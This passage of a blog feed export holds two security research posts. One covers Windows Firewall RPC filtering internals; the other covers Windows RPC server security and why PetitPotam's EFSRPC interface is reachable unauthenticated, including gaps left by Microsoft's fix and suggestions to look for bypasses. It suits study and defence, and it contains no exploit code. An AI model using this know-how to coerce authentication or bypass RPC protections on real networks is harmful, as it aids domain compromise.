courier;\">FWPM_CONDITION_SEC_KEY_SIZE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RawData&nbsp; &nbsp;UInt32</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_IP_LOCAL_ADDRESS_V4&nbsp; &nbsp;IPAddress UInt32</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_IP_LOCAL_ADDRESS_V6&nbsp; &nbsp;IPAddress ByteArray16</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_IP_LOCAL_PORT&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RawData&nbsp; &nbsp;UInt16</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_PIPE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RawData&nbsp; &nbsp;ByteBlob</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_IP_REMOTE_ADDRESS_V4&nbsp; IPAddress UInt32</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_IP_REMOTE_ADDRESS_V6&nbsp; IPAddress ByteArray16</span></div></div><div><br /></div><div>There's quite a few potential configuration options for the filter. You can filter based on the remote user token that's authenticated to the interface. Or you can filters based on the authentication level and type. This could allow you to protect an RPC interface so that all callers have to use Kerberos with at&nbsp;<i>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</i> level.&nbsp;</div><div><br /></div><div>Anyway, configuring it is less important to us, you probably want to know how it works, as the first step to trying to find a way to bypass it is to know where this filter layer is processed (note, I've not found a bypass, but you never know).&nbsp;</div><div><br /></div><div>Perhaps unsurprisingly due to the complexity of the RPC protocol the filtering is implemented within the RPC server process through the <i>RpcRtRemote</i> extension DLL. Except for RPCSS this DLL isn't loaded by default. Instead it's only loaded if there exists a value for the&nbsp;<i>WNF_RPCF_FWMAN_RUNNING</i> WNF state. The following shows the state after adding the two RPC filter rules with <i>netsh</i>.</div><div><br /></div><div><div><span style=\"font-family: courier;\">PS&gt; $wnf = Get-NtWnf -Name 'WNF_RPCF_FWMAN_RUNNING'</span></div><div><span style=\"font-family: courier;\">PS&gt; $wnf.QueryStateData()</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\">Data ChangeStamp</span></div><div><span style=\"font-family: courier;\">---- -----------</span></div><div><span style=\"font-family: courier;\">{}&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;2</span></div></div><div><br /></div><div>The RPC runtime sets up a subscription to load the DLL if the WNF value is ever changed. Once loaded the RPC runtime will register all current interfaces to check the firewall. The filter rules are checked when a call is made to the interface during the normal processing of the security callback. The runtime will invoke the&nbsp;<i>FwFilter </i>function inside <i>RpcRtRemote</i>, passing all the details about the firewall interface call. The filter call is only made for DCE/RPC protocols, so not ALPC. It also will only be called if the caller is remote. This is always the case if the call comes via TCP, but for named pipes it will only be called if the pipe was opened via SMB.</div><div><br /></div><div>Here's where we can finally determine how the RPC filter is processed. The <i>FwFilter</i> function builds a list of firewall values corresponding to the list of fields for the&nbsp;<i>FWPM_LAYER_RPC_UM</i> layer and passes them to the&nbsp;<a href=\"https://docs.microsoft.com/en-us/previous-versions/bb309061(v=vs.85)\">FwpsClassifyUser0</a> API along with the numeric ID of the layer. This API will enumerate all filters for the layer and apply the condition checks returning the classification, e.g. block or permit. Based on this classification the RPC runtime can permit or refuse the call.&nbsp;</div><div><br /></div><div>In order for a filter to be accessible for classification the RPC server must have&nbsp;<i>FWPM_ACTRL_OPEN</i> access to the engine and&nbsp;<i>FWPM_ACTRL_CLASSIFY</i> access to the filter. By default the <i>Everyone</i> group has these access rights, however AppContainers and potentially other sandboxes do not. However, in general AppContainer processes don't tend to create privileged RPC servers, at least any which a remote attacker would find useful. You can check the access on various firewall objects using the&nbsp;<i>Get-AccessibleFwObject</i> command.</div><div><br /></div><div><span style=\"font-family: courier;\">PS&gt;&nbsp;$token = Get-NtToken -Filtered -Flags LuaToken</span></div><div><div><span style=\"font-family: courier;\">PS&gt; Get-AccessibleFwObject -Token $token | Where-Object Name -eq RPCFilter</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\">TokenId Access&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Name</span></div><div><span style=\"font-family: courier;\">------- ------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;----</span></div><div><span style=\"font-family: courier;\">4ECF80&nbsp; Classify|Open RPCFilter</span></div><div><span style=\"font-family: courier;\">4ECF80&nbsp; Classify|Open RPCFilter</span></div></div><div><br /></div><div>I hope this gives enough information for someone to dig into it further to see if there's any obvious bypass I missed. I'm sure there's probably some fun trick you could do to circumvent restrictions if you look hard enough :-)</div><div><br /></div>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/9860984167419167"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/9860984167419167"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2021/08/how-windows-firewall-rpc-filter-works.html", "title": "How the Windows Firewall RPC Filter Works"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-101301496452829477", "guidislink": true, "link": "https://www.tiraniddo.dev/2021/08/how-to-secure-windows-rpc-server-and.html", "published": "2021-08-14T19:04:00.008-07:00", "published_parsed": [2021, 8, 15, 2, 4, 0, 6, 227, 0], "updated": "2021-08-17T12:16:51.894-07:00", "updated_parsed": [2021, 8, 17, 19, 16, 51, 1, 229, 0], "tags": [{"term": "Exploit", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "MSRPC", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "How to secure a Windows RPC Server, and how not to.", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "How to secure a Windows RPC Server, and how not to."}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p>The <a href=\"https://github.com/topotam/PetitPotam\">PetitPotam</a>&nbsp;technique is still fresh in people's minds. While it's not directly an exploit it's a useful step to get unauthenticated NTLM from a privileged account to forward to something like the AD CS Web Enrollment service to compromise a Windows domain. Interestingly after Microsoft initially shrugged about fixing any of this they went and released <a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942\">a fix</a>, although it seems to be insufficient at the time of writing.</p><p>While there's plenty of details about how to abuse the EFSRPC interface, there's little on why it's exploitable to begin with. I thought it'd be good to have a quick overview of how Windows RPC interfaces are secured and then by extension why it's possible to use the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31\">EFSRPC</a> interface unauthenticated.&nbsp;</p><p><i>Caveat: No doubt I might be missing other security checks in RPC, these are the main ones I know about :-)</i></p><h3 style=\"text-align: left;\">RPC Server Security</h3><div>The server security of RPC is one which has seemingly built up over time. Therefore there's various ways of doing it, and some ways are better than others. There are basically three approaches, which can be mixed and matched:</div><div><ol style=\"text-align: left;\"><li>Securing the endpoint</li><li>Securing the interface</li><li>Ad-hoc security</li></ol><div>Let's take each one in turn to determine how each one secures the RPC server.</div></div><div><br /></div><h4 style=\"text-align: left;\">Securing the Endpoint</h4><div>You register the endpoint that the RPC server will listen on using the&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserveruseprotseqep\">RpcServerUseProtseqEp</a> API. This API takes the type of endpoint, such as <i>ncalrpc (ALPC)</i>, <i>ncacn_np (named pipe)</i>&nbsp;or <i>ncacn_ip_tcp (TCP socket)</i> and creates the listening endpoint. For example the following would create a named pipe endpoint called <i>DEMO</i>.</div><div><br /></div><div><div><span style=\"font-family: courier;\">RpcServerUseProtseqEp(</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; L\"ncacn_np\",</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; RPC_C_PROTSEQ_MAX_REQS_DEFAULT,</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; L\"\\\\pipe\\\\DEMO\",</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; nullptr);</span></div></div><div><br /></div><div>The final parameter is optional but represents a security descriptor (SD) you assign to the endpoint to limit who has access. This can only be enforced on ALPC and named pipes as something like a TCP socket doesn't (technically) have an access check when it's connected to. If you don't specify an SD then a default is assigned. For a named pipe the default DACL grants the following uses write access:</div><div><div><ul style=\"text-align: left;\"><li><span style=\"font-family: inherit;\">Everyone</span></li><li><span style=\"font-family: inherit;\">NT AUTHORITY\\ANONYMOUS LOGON</span></li><li><span style=\"font-family: inherit;\">SELF</span></li></ul></div></div><div>Where <i>SELF</i> is the creating user's SID. This is a pretty permissive SD. One interesting thing about RPC endpoints is they are multiplexed. You don't explicit associate an endpoint with the RPC interface you want to access. Instead you can connect to any endpoint that the process has created. The end result is that if there's a less secure endpoint in the same process it might be possible to access an interface using the least secure one. In general this makes relying on endpoint security risky, especially in processes which run multiple services, such as LSASS. In any case if you want to use a TCP endpoint you can't rely on the endpoint security as it doesn't exist.</div><div><br /></div><h4 style=\"text-align: left;\">Securing the Interface</h4><div>The next way of securing the RPC server is to secure the interface itself. You register the interface structure that was generated by MIDL using one of the following APIs:</div><div><ul style=\"text-align: left;\"><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterif\">RpcServerRegisterIf</a></li><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterif2\">RpcServerRegisterIf2</a></li><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterifex\">RpcServerRegisterIfEx</a></li><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterif3\">RpcServerRegisterIf3</a></li><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverinterfacegroupcreatew\">RpcServerInterfaceGroupCreate</a></li></ul><div>Each has a varying number of parameters some of which determine the security of the interface. The latest APIs are&nbsp;<i>RpcServerRegisterIf3</i> and&nbsp;<i>RpcServerInterfaceGroupCreate</i>&nbsp;which were introduced in Windows 8. The latter is just a way of registering multiple interfaces in one call so we'll just focus on the former. The&nbsp;<i>RpcServerRegisterIf3</i> has three parameters which affect security,&nbsp;<i>SecurityDescriptor,&nbsp;</i><i>IfCallback</i> and&nbsp;<i>Flags.</i>&nbsp;</div></div><div><br /></div><div>The&nbsp;<i>SecurityDescriptor </i>parameter is easiest to explain. It assigns an SD to the interface, when a call is made on that interface then the caller's token is checked against the SD and access is only granted if the check passes. If no SD is specified a default is used which grants the following SIDs access (assuming a non-AppContainer process)</div><div><ul style=\"text-align: left;\"><li>NT AUTHORITY\\ANONYMOUS LOGON</li><li>Everyone</li><li>NT AUTHORITY\\RESTRICTED</li><li>BUILTIN\\Administrators</li><li>SELF</li></ul><div>The token to use for the access check is based either on the client's authentication (we'll discuss this later) or the authentication for the endpoint. ALPC and named pipe are authenticated transports, where as TCP is not. When using an unauthenticated transport the access check will be against the anonymous token. This means if the SD does not contain an allow ACE for&nbsp;<i>ANONYMOUS LOGON</i> it will be blocked.</div></div><div><br /></div><div><i>Note, due to a quirk of the access check process the RPC runtime grants access if the caller has any access granted, not a specific access right. What this means is that if the caller is considered the owner, which is normally set to the creating user SID they might only be granted READ_CONTROL but that's sufficient to bypass the check. This could also be useful if the caller has SeTakeOwnershipPrivilege <a href=\"https://www.tiraniddo.dev/2021/06/the-much-misunderstood.html\">or similar</a> as it'd be possible to generically bypass the interface SD check (though of course that privilege is dangerous in its own right).</i></div><div><br /></div><div>The second parameter, <i>IfCallback</i>, takes an <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nc-rpcdce-rpc_if_callback_fn\">RPC_IF_CALLBACK</a> function pointer. This callback function will be invoked when a call is made to the interface, although it will be called after the SD is checked. If the callback function returns&nbsp;<i>RPC_S_OK</i> then the call will be allowed, anything else will deny the call. The callback gets a pointer to the interface and the binding handle and can do various checks to determine if the caller is allowed to access the interface.</div><div><br /></div><div><div>A common check is for the client's&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/authentication-level-constants\">authentication level</a>. The client can specify the level to use when connecting to the server using the&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingsetauthinfo\">RpcBindingSetAuthInfo</a>&nbsp;API however the server can't directly specify the minimum authentication level it accepts. Instead the callback can use the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindinginqauthclient\">RpcBindingInqAuthClient</a>&nbsp;API to determine what the client used and grant or deny access based on that. The authentication levels we typically care about are as follows:</div><div><ul><li><i>RPC_C_AUTHN_LEVEL_NONE</i>&nbsp;- No authentication</li><li><i>RPC_C_AUTHN_LEVEL_CONNECT</i>&nbsp;- Authentication at connect time, but not per-call.</li><li><i>RPC_C_AUTHN_LEVEL_PKT_INTEGRITY</i>&nbsp;- Authentication at connect time, each call has integrity protection.</li><li><i>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</i>&nbsp;- Authentication at connect time, each call is encrypted and has integrity protection.</li></ul><div>The authentication is implemented using a defined authentication service, such as NTLM or Kerberos, though that doesn't really matter for our purposes. Also note that this is only used for RPC services available over remote protocols such as named pipes or TCP. If the RPC server listens on ALPC then it's assumed to always be&nbsp;<i>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</i>. Other checks the server could do would be the protocol sequence the client used, this would allow rejecting access via TCP but permit named pipes.</div></div></div><div><br /></div><div>The final parameter is the <a href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/interface-registration-flags\">flags</a>. The flag most obviously related to security is&nbsp;<i>RPC_IF_ALLOW_SECURE_ONLY (0x8)</i>. This blocks access to the interface if the current authentication level is&nbsp;<i>RPC_C_AUTHN_LEVEL_NONE</i>. This means the caller must be able to authenticate to the server using one of the permitted authentication services. It's not sufficient to use a NULL session, at least on any modern version of Windows. Of course this doesn't say much about who has authenticated, a server might still want to check the caller's identity.</div><div><br /></div><div>The other important flag is&nbsp;<i>RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH (0x10)</i>. If the server specifies a security callback and this flag is not set then any unauthenticated client will be automatically rejected.&nbsp;</div><div><br /></div><div>If this wasn't complex enough there's at least one other related setting which applies system wide which will determine what type of clients can access what RPC server. The <a href=\"https://admx.help/?Category=Windows_10_2016&amp;Policy=Microsoft.Policies.RemoteProcedureCalls::RpcRestrictRemoteClients\">Restrict Unauthenticated RPC Clients</a>&nbsp;group policy. By default this is set to <i>None</i> if the RPC server is running on a server SKU of Windows and <i>Authenticated</i> on a client SKU.&nbsp;</div><div><br /></div><div>In general what this policy does is limit whether a client can use an unauthenticated transport such as TCP when they haven't also separately authenticated to an valid authentication level. When set to <i>None</i> RPC servers can be accessed via an unauthenticated transport subject to any other restrictions the interface is registered with. If set to&nbsp;<i>Authenticated</i> then calls over unauthenticated transports are rejected, unless the&nbsp;<i>RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH</i> flag is set for the interface or the client has authenticated separately. There's a third option, <i>Authenticated without exceptions</i>, which will block the call in all circumstances if the caller isn't using an authenticated transport.&nbsp;</div><div><br /></div><h4 style=\"text-align: left;\">Ad-hoc Security</h4><div>The final types of checks are basically anything else the server does to verify the caller. A common approach would be to perform a check within a specific function on the interface. For example, a server could generally allow unauthenticated clients, except when calling a method to read a important secret value. At that point is could insert an authentication level check to ensure the client has authenticated at&nbsp;<i>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</i> so that the secret will be encrypted when returned to the client.&nbsp;</div><div><br /></div><div>Ultimately you'll have to check each function you're interested in to determine what, if any, security checks are in place. As with all ad-hoc checks it's possible that there's a logic bug in there which can be exploited to bypass the security restrictions.</div><div><br /></div><h3 style=\"text-align: left;\">Digging into EFSRPC</h3><div>Okay, that covers the basics of how an RPC server is secured. Let's look at the specific example of the EFSRPC server abused by <i>PetitPotam</i>. Oddly there's two implementation of the RPC server, one in <i>efslsaext.dll</i> which the interface UUID of&nbsp;<i>c681d488-d850-11d0-8c52-00c04fd90f7e</i> and one in efssvc.dll with the interface UUID of&nbsp;<i>df1941c5-fe89-4e79-bf10-463657acf44d</i>. The one in <i>efslsaext.dll</i> is the one which is accessible unauthenticated, so let's start there. We'll go through the three approaches to securing the server to determine what it's doing.</div><div><br /></div><div>First, the server does not register any of its own protocol sequences, with SDs or not. What this means is who can call the RPC server is dependent on what other endpoints have been registered by the hosting process, which in this case is LSASS.</div><div><br /></div><div>Second, checking the for calls to one of the RPC server interface registration functions there's a single call to&nbsp;<i>RpcServerRegisterIfEx</i> in&nbsp;<i>InitializeLsaExtension</i>. This allows the caller to specify the security callback but not an SD. However in this case it doesn't specify any security callback. The&nbsp;<i>InitializeLsaExtension</i> function also does not specify either of the two security flags (it sets&nbsp;<i>RPC_IF_AUTOLISTEN</i> which doesn't have any security impact). This means that in general any authenticated caller is permitted.</div><div><br /></div><div>Finally, from an ad-hoc security perspective all the main functions such as&nbsp;<i>EfsRpcOpenFileRaw</i> call the function&nbsp;<i>EfsRpcpValidateClientCall</i> which looks something like the following (error check removed).</div><div><br /></div><div><div><span style=\"font-family: courier;\">void EfsRpcpValidateClientCall(RPC_BINDING_HANDLE Binding,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PBOOL ValidClient) {</span></div><div><span style=\"font-family: courier;\">&nbsp; unsigned int ClientLocalFlag;</span></div><div><span style=\"font-family: courier;\">&nbsp; I_RpcBindingIsClientLocal(NULL, &amp;ClientLocalFlag);</span></div><div><span style=\"font-family: courier;\">&nbsp; if (!ClientLocalFlag) {</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; RPC_WSTR StringBinding;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; RpcBindingToStringBindingW(Binding, &amp;StringBinding);</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; RpcStringBindingParseW(StringBinding, NULL, &amp;Protseq,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;NULL, NULL, NULL);</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; if (CompareStringW(LOCALE_INVARIANT, NORM_IGNORECASE,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; Protseq, -1, L\"ncacn_np\", -1) == CSTR_EQUAL)</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; *ValidClient = TRUE;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; }</span></div><div><span style=\"font-family: courier;\">&nbsp; }</span></div><div><span style=\"font-family: courier;\">}</span></div></div><div><br /></div><div>Basically the <i>ValidClient </i>parameter will only be set to <i>TRUE</i> if the caller used the named pipe transport and the pipe wasn't opened locally, i.e. the named pipe was opened over SMB. This is basically all the security that's being checked for. Therefore the only security that could be enforced is limited by who's allowed to connect to a suitable named pipe endpoint.</div><div><br /></div><div>At a minimum LSASS registers the <i>\\pipe\\lsass</i>&nbsp;named pipe endpoint. When it's setup in <i>lsasrv.dll</i> a SD is defined for the named pipe that grants the following users access:</div><div><div><ul style=\"text-align: left;\"><li>Everyone</li><li>NT AUTHORITY\\ANONYMOUS LOGON</li><li>BUILTIN\\Administrators</li></ul></div></div><div>Therefore in theory the anonymous user has access to the pipe, and as there are no other security checks in place in the interface definition. Now typically anonymous access isn't granted by default to named pipes via a NULL session, however domain controllers have an exception to this policy through the configured <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-named-pipes-that-can-be-accessed-anonymously\">Network access: Named Pipes that can be accessed anonymously</a> security option. For DCs this allows <i>lsarpc</i>, <i>samr</i> and <i>netlogon</i> pipes, which are all aliases for the <i>lsass</i> pipe, to be accessed anonymously.</div><div><br /></div><div>You can now understand why the EFS RPC server is accessible anonymously on DCs. How does the other EFS RPC server block access? In that case it specifies an interface SD to limit access to only the <i>Everyone</i> group and <i>BUILTIN\\Administrators</i>. By default the anonymous user isn't a member of <i>Everyone </i>(although it can be configured as such) therefore this blocks access even if you connected via the <i>lsass </i>pipe.</div><div><br /></div><h3 style=\"text-align: left;\">The Fix is In</h3><div>What did Microsoft do to fix <i>PetitPotam</i>? One thing they definitely didn't do is change the interface registration or the named pipe endpoint security. Instead they added an additional ad-hoc check to&nbsp;<i>EfsRpcOpenFileRaw</i>. Specifically they added the following code:</div><div><br /></div><div><div><span style=\"font-family: courier;\">DWORD AllowOpenRawDL = 0;</span></div><div><span style=\"font-family: courier;\">RegGetValueW(</span></div><div><span style=\"font-family: courier;\">&nbsp; HKEY_LOCAL_MACHINE,</span></div><div><span style=\"font-family: courier;\">&nbsp; L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\EFS\",</span></div><div><span style=\"font-family: courier;\">&nbsp; L\"AllowOpenRawDL\",</span></div><div><span style=\"font-family: courier;\">&nbsp; RRF_RT_REG_DWORD | RRF_ZEROONFAILURE,</span></div><div><span style=\"font-family: courier;\">&nbsp; NULL,</span></div><div><span style=\"font-family: courier;\">&nbsp; &amp;AllowOpenRawDL);</span></div><div><span style=\"font-family: courier;\">if (AllowOpenRawDL == 1 &amp;&amp;&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; !EfsRpcpValidateClientCall(hBinding, &amp;ValidClient) &amp;&amp; ValidClient) {</span></div><div><span style=\"font-family: courier;\">&nbsp; // Call allowed.</span></div><div><span style=\"font-family: courier;\">}</span></div></div><div><br /></div><div>Basically unless the&nbsp;<i>AllowOpenRawDL</i> registry value is set to one then the call is blocked entirely regardless of the authenticating client. This seems to be a perfectly valid fix, except that&nbsp;<i>EfsRpcOpenFileRaw </i>isn't the only function usable to start an NTLM authentication session. As pointed out by <a href=\"https://twitter.com/tifkin_/status/1421225980161626112\">Lee Christensen</a> you can also do it via&nbsp;<i>EfsRpcEncryptFileSrv </i>or&nbsp;<i>EfsRpcQueryUsersOnFile </i>or others. Therefore as no other changes were put in place these other functions are accessible just as unauthenticated as the original.</div><div><br /></div><div>It's really unclear how Microsoft didn't see this, but I guess they might have been blinded by them actually fixing something which they were adamant was a configuration issue that sysadmins had to deal with.&nbsp;</div><div><br /></div><div><i>UPDATE 2021/08/17: It's worth noting that while you can access the other functions unauthenticated it seems any network access is done using the \"authenticated\" caller, i.e. the ANONYMOUS user so it's probably not that useful. The point of this blog is not about abusing EFSRPC but why it's abusable :-)</i></div><div><br /></div><div>Anyway I hope that explains why <i>PetitPotam </i>works unauthenticated (props to <a href=\"https://twitter.com/topotam77\">topotam77</a> for the find) and might give you some insight into how you can determine what RPC servers might be accessible going forward.&nbsp;</div><div><br /></div>"}], "summary": "<p>The <a href=\"https://github.com/topotam/PetitPotam\">PetitPotam</a>&nbsp;technique is still fresh in people's minds. While it's not directly an exploit it's a useful step to get unauthenticated NTLM from a privileged account to forward to something like the AD CS Web Enrollment service to compromise a Windows domain. Interestingly after Microsoft initially shrugged about fixing any of this they went and released <a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942\">a fix</a>, although it seems to be insufficient at the time of writing.</p><p>While there's plenty of details about how to abuse the EFSRPC interface, there's little on why it's exploitable to begin with. I thought it'd be good to have a quick overview of how Windows RPC interfaces are secured and then by extension why it's possible to use the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31\">EFSRPC</a> interface unauthenticated.&nbsp;</p><p><i>Caveat: No doubt I might be missing other security checks in RPC, these are the main ones I know about :-)</i></p><h3 style=\"text-align: left;\">RPC Server Security</h3><div>The server security of RPC is one which has seemingly built up over time. Therefore there's various ways of doing it, and some ways are better than others. There are basically three approaches, which can be mixed and matched:</div><div><ol style=\"text-align: left;\"><li>Securing the endpoint</li><li>Securing the interface</li><li>Ad-hoc security</li></ol><div>Let's take each one in turn to determine how each one secures the RPC server.</div></div><div><br /></div><h4 style=\"text-align: left;\">Securing the Endpoint</h4><div>You register the endpoint that the RPC server will listen on using the&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserveruseprotseqep\">RpcServerUseProtseqEp</a> API. This API takes the type of endpoint, such as <i>ncalrpc (ALPC)</i>, <i>ncacn_np (named pipe)</i>&nbsp;or <i>ncacn_ip_tcp (TCP socket)</i> and creates the listening endpoint. For example the following would create a named pipe endpoint called <i>DEMO</i>.</div><div><br /></div><div><div><span style=\"font-family: courier;\">RpcServerUseProtseqEp(</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; L\"ncacn_np\",</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; RPC_C_PROTSEQ_MAX_REQS_DEFAULT,</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; L\"\\\\pipe\\\\DEMO\",</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; nullptr);</span></div></div><div><br /></div><div>The final parameter is optional but represents a security descriptor (SD) you assign to the endpoint to limit who has access. This can only be enforced on ALPC and named pipes as something like a TCP socket doesn't (technically) have an access check when it's connected to. If you don't specify an SD then a default is assigned. For a named pipe the default DACL grants the following uses write access:</div><div><div><ul style=\"text-align: left;\"><li><span style=\"font-family: inherit;\">Everyone</span></li><li><span style=\"font-family: inherit;\">NT AUTHORITY\\ANONYMOUS LOGON</span></li><li><span style=\"font-family: inherit;\">SELF</span></li></ul></div></div><div>Where <i>SELF</i> is the creating user's SID. This is a pretty permissive SD. One interesting thing about RPC endpoints is they are multiplexed. You don't explicit associate an endpoint with the RPC interface you want to access. Instead you can connect to any endpoint that the process has created. The end result is that if there's a less secure endpoint in the same process it might be possible to access an interface using the least secure one. In general this makes relying on endpoint security risky, especially in processes which run multiple services, such as LSASS. In any case if you want to use a TCP endpoint you can't rely on the endpoint security as it doesn't exist.</div><div><br /></div><h4 style=\"text-align: left;\">Securing the Interface</h4><div>The next way of securing the RPC server is to secure the interface itself. You register the interface structure that was generated by MIDL using one of the following APIs:</div><div><ul style=\"text-align: left;\"><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterif\">RpcServerRegisterIf</a></li><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterif2\">RpcServerRegisterIf2</a></li><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterifex\">RpcServerRegisterIfEx</a></li><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterif3\">RpcServerRegisterIf3</a></li><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverinterfacegroupcreatew\">RpcServerInterfaceGroupCreate</a></li></ul><div>Each has a varying number of parameters some of which determine the security of the interface. The latest APIs are&nbsp;<i>RpcServerRegisterIf3</i> and&nbsp;<i>RpcServerInterfaceGroupCreate</i>&nbsp;which were introduced in Windows 8. The latter is just a way of registering multiple interfaces in one call so we'll just focus on the former. The&nbsp;<i>RpcServerRegisterIf3</i> has three parameters which affect security,&nbsp;<i>SecurityDescriptor,&nbsp;</i><i>IfCallback</i> and&nbsp;<i>Flags.</i>&nbsp;</div></div><div><br /></div><div>The&nbsp;<i>SecurityDescriptor </i>parameter is easiest to explain. It assigns an SD to the interface, when a call is made on that interface then the caller's token is checked against the SD and access is only granted if the check passes. If no SD is specified a default is used which grants the following SIDs access (assuming a non-AppContainer process)</div><div><ul style=\"text-align: left;\"><li>NT AUTHORITY\\ANONYMOUS LOGON</li><li>Everyone</li><li>NT AUTHORITY\\RESTRICTED</li><li>BUILTIN\\Administrators</li><li>SELF</li></ul><div>The token to use for the access check is based either on the client's authentication (we'll discuss this later) or the authentication for the endpoint. ALPC and named pipe are authenticated transports, where as TCP is not. When using an unauthenticated transport the access check will be against the anonymous token. This means if the SD does not contain an allow ACE for&nbsp;<i>ANONYMOUS LOGON</i> it will be blocked.</div></div><div><br /></div><div><i>Note, due to a quirk of the access check process the RPC runtime grants access if the caller has any access granted, not a specific access right. What this means is that if the caller is considered the owner, which is normally set to the creating user SID they might only be granted READ_CONTROL but that's sufficient to bypass the check. This could also be useful if the caller has SeTakeOwnershipPrivilege <a href=\"https://www.tiraniddo.dev/2021/06/the-much-misunderstood.html\">or similar</a> as it'd be possible to generically bypass the interface SD check (though of course that privilege is dangerous in its own right).</i></div><div><br /></div><div>The second parameter, <i>IfCallback</i>, takes an <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nc-rpcdce-rpc_if_callback_fn\">RPC_IF_CALLBACK</a> function pointer. This callback function will be invoked when a call is made to the interface, although it will be called after the SD is checked. If 